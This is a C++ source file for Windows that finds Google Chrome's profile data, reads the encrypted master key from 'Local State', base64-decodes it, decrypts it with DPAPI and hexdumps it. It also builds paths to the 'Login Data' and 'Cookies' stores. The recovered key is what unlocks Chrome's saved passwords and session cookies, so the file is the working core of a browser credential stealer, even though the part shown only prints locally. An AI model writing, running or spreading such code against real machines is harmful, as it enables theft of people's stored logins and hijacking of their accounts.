#include "crypto.hxx"
#include <iostream>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <ShlObj.h>
#include <nlohmann/json.hpp>
#include <wil/resource.h>

namespace {
void hexdump(const uint8_t *addr, size_t len, const char *desc = NULL);
}

int main() {
    wil::unique_cotaskmem_string local_appdata_path;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL, &local_appdata_path);

    std::filesystem::path chrome_base_path = local_appdata_path.get();
    chrome_base_path /= "Google\\Chrome\\User Data";
    std::filesystem::path chrome_key_path = chrome_base_path / "Local State",
                          chrome_login_path = chrome_base_path / "Default" / "Login Data",
                          chrome_cookies_path = chrome_base_path / "Default" / "Cookies";

    std::wcout << "key path: "     << chrome_key_path << "\n"
               << "login path: "   << chrome_login_path << "\n"
               << "cookies path: " << chrome_cookies_path << "\n";

    std::ifstream key_file(chrome_key_path);

    using json = nlohmann::json;
    std::vector<uint8_t> key;
    try {
        json j = json::parse(key_file);
        std::string key_string = j["os_crypt"]["encrypted_key"];
        std::cout << "raw key: " << key_string << "\n";
        key = base64_decode(&key_string[0]);
    } catch (json::exception &) {
        std::wcerr << L"error reading json\n";
        return 1;
    }
    hexdump(&key[0], key.size(), "base64 decoded key");

    key.erase(key.begin(), key.begin() + 5); // TODO vector isn't a good container for this operation
    key = dpapi_decrypt(key);
    hexdump(&key[0], key.size(), "DPAPI decrypted key");
}

namespace {
void hexdump(const uint8_t *addr, size_t len, const char *desc) {
    if (desc) {
        printf("%s:\n", desc);
    }

    const short bytes_per_line = 16;

    char ascii_representation[bytes_per_line] = {0};

    int i;
    for (i = 0; i < len; ++i) {
        if ((i % bytes_per_line) == 0) {
            printf("%08X |", i);
        }

        printf(" %02X", addr[i]);

        if (isprint(addr[i])) {
            ascii_representation[i % bytes_per_line] = addr[i];
        } else {
            ascii_representation[i % bytes_per_line] = '.';
        }

        if ((i % bytes_per_line) == bytes_per_line - 1) {
            // ascii_representation is not null terminated so print exactly bytes_per_line characters
            printf(" | %.*s\n", bytes_per_line, ascii_representation);
        }
    }

    if (i % 16 != 0) {
        // pad last line if not a full 16 bytes
        for (int j = i; j % bytes_per_line != 0; ++j) {
            printf("   ");
        }

        printf(" | %.*s\n", i % bytes_per_line, ascii_representation);
    }
}
}